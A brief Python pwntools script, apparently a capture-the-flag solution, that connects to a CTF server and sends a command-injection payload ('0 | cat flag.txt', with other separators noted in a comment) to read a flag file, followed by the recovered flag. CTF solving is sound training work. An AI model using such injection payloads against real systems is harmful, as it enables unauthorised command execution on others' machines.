from pwn import *

# context.log_level = 'DEBUG'
p = remote('pwn.ctf.ae', 9812)

p.recv()

payload = "0 | " # ; & &&
# payload += "id"
payload += "cat flag.txt"

p.sendline(payload)
p.interactive()

# CTFAE{LooksLikeYouProcrastinatedTooHard}
